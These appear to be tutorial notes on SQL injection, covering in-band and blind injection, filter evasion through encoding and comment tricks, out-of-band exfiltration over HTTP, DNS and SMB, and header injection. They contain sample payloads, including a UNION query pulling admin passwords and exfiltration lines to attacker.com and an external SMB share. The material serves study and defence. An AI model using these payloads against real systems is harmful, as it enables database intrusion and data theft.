



In-band SQL Injection

This technique is considered the most common and straightforward type of SQL injection attack. In this technique, the attacker uses the same communication channel for both the injection and the retrieval of data. There are two primary types of in-band SQL injection:

Error-Based SQL Injection: The attacker manipulates the SQL query to produce error messages from the database. These error messages often contain information about the database structure, which can be used to exploit the database further. Example: SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version)). If the database version is returned in the error message, it reveals information about the database.
Union-Based SQL Injection: The attacker uses the UNION SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables. Example: SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin.
Inferential (Blind) SQL Injection

Inferential SQL injection does not transfer data directly through the web application, making exploiting it more challenging. Instead, the attacker sends payloads and observes the application’s behaviour and response times to infer information about the database. There are two primary types of inferential SQL injection:

Boolean-Based Blind SQL Injection: The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition. By analysing the application’s response, the attacker can infer whether the payload was true or false. Example: SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition). The attacker can infer the result if the page content or behaviour changes based on the condition.
Time-Based Blind SQL Injection: The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false. For example, SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--. If the response is delayed by 5 seconds, the attacker can infer that the condition was true.

Character Encoding
Character encoding involves converting special characters in the SQL injection payload into encoded forms that may bypass input filters.

URL Encoding: URL encoding is a common method where characters are represented using a percent (%) sign followed by their ASCII value in hexadecimal. For example, the payload ' OR 1=1-- can be encoded as %27%20OR%201%3D1--. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognise it as malicious during initial processing.
Hexadecimal Encoding: Hexadecimal encoding is another effective technique for constructing SQL queries using hexadecimal values. For instance, the query SELECT * FROM users WHERE name = 'admin' can be encoded as SELECT * FROM users WHERE name = 0x61646d696e. By representing characters as hexadecimal numbers, the attacker can bypass filters that do not decode these values before processing the input.
Unicode Encoding: Unicode encoding represents characters using Unicode escape sequences. For example, the string admin can be encoded as \u0061\u0064\u006d\u0069\u006e. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.


No-Quote SQL Injection

No-Quote SQL injection techniques are used when the application filters single or double quotes or escapes.

Using Numerical Values: One approach is to use numerical values or other data types that do not require quotes. For example, instead of injecting ' OR '1'='1, an attacker can use OR 1=1 in a context where quotes are not necessary. This technique can bypass filters that specifically look for an escape or strip out quotes, allowing the injection to proceed.
Using SQL Comments: Another method involves using SQL comments to terminate the rest of the query. For instance, the input admin'-- can be transformed into admin--, where the -- signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.
Using CONCAT() Function: Attackers can use SQL functions like CONCAT() to construct strings without quotes. For example, CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) constructs the string admin. The CONCAT() function and similar methods allow attackers to build strings without directly using quotes, making it harder for filters to detect and block the payload.
No Spaces Allowed

When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.

Comments to Replace Spaces: One common method is to use SQL comments (/**/) to replace spaces. For example, instead of SELECT * FROM users WHERE name = 'admin', an attacker can use SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'. SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.
Tab or Newline Characters: Another approach is using tab (\t) or newline (\n) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'. This technique can bypass filters that specifically look for spaces.
Alternate Characters: One effective method is using alternative URL-encoded characters representing different types of whitespace, such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space). These characters can replace spaces in the payload. 

HTTP Requests

By leveraging database functions that allow HTTP requests, attackers can send sensitive data directly to a web server they control. This method exploits database functionalities that can make outbound HTTP connections. Although MySQL and MariaDB do not natively support HTTP requests, this can be done through external scripts or User Defined Functions (UDFs) if the database is configured to allow such operations.

First, the UDF needs to be created and installed to support HTTP requests. This setup is complex and usually involves additional configuration. An example query would look like SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;.

HTTP request exfiltration can be implemented on Windows and Linux (Ubuntu) systems, depending on the database's support for external scripts or UDFs that enable HTTP requests.

DNS Exfiltration 

Attackers can use SQL queries to generate DNS requests with encoded data, which is sent to a malicious DNS server controlled by the attacker. This technique bypasses HTTP-based monitoring systems and leverages the database's ability to perform DNS lookups.

As discussed above, MySQL does not natively support generating DNS requests through SQL commands alone, attackers might use other means such as custom User-Defined Functions (UDFs) or system-level scripts to perform DNS lookups.

SMB Exfiltration

SMB exfiltration involves writing query results to an SMB share on an external server. This technique is particularly effective in Windows environments but can also be configured in Linux systems with the right setup. an example query would look like SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';.

This is fully supported as Windows natively supports SMB/UNC paths. Linux (Ubuntu): While direct UNC paths are more native to Windows, SMB shares can be mounted and accessed in Linux using tools like smbclient or by mounting the share to a local directory. Directly using UNC paths in SQL queries may require additional setup or scripts to facilitate the interaction.


Important Consideration

It is important to note that the MySQL system variable secure_file_priv may be set. When set, this variable contains a directory pathname, and MySQL will only allow files to be written to this specified directory. This security measure helps mitigate the risk of unauthorised file operations. 

When secure_file_priv is Set: MySQL will restrict file operations such as INTO OUTFILE to the specified directory. This means attackers can only write files to this directory, limiting their ability to exfiltrate data to arbitrary locations.
When secure_file_priv is Empty: If the secure_file_priv variable is empty, MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This configuration poses a higher risk as it provides more flexibility for attackers.

HTTP Header Injection

HTTP headers can carry user input, which might be used in SQL queries on the server side. user-agent injectionIf these inputs are not sanitised, it can lead to SQL injection. The technique involves manipulating HTTP headers (like User-Agent, Referer, or X-Forwarded-For) to inject SQL commands. The server might log these headers or use them in SQL queries. For example, a malicious User-Agent header would look like User-Agent: ' OR 1=1; --. If the server includes the User-Agent header in an SQL query without sanitising it, it can result in SQL injection.



